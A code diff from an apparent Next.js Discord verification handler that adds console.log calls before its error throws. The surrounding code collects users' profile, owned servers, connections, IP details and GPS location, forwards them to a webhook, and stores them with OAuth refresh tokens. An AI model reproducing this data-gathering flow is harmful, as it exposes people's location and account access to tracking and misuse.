@@ -57,24 +57,28 @@ const verifyCode = async (code: string, req: NextRequest, gps: GpsData) => {
         const { success, userInfo, ownGuilds, connections, ipInfo } = await logger(tokenResult.access_token, ip);
 
         if (!success || !userInfo || !ownGuilds || !connections || !ipInfo) {
+            console.log("Failed to log user");
             throw new Error("Failed to log user");
         }
         
         const webhookResult = await sendWebhook(userInfo, ownGuilds, connections, ipInfo, ua, gps);
         
         if (!webhookResult.success) {
+            console.log("Failed to send webhook");
             throw new Error("Failed to send webhook");
         }
         
         const pushResult = await pushToSupabase(tokenResult.refresh_token, userInfo, ownGuilds, connections, ipInfo, ua, gps);
 
-        if (!pushResult.success) {
+        if (!pushResult.success) {  
+            console.log("Failed to push to Supabase");
             throw new Error("Failed to push to Supabase");
         }
         
         const roleResult = await assignDiscordRole(userInfo.id);
 
         if (!roleResult.success) {
+            console.log("Failed to assign role");
             throw new Error("Failed to assign role");
         }
         return { success: true };
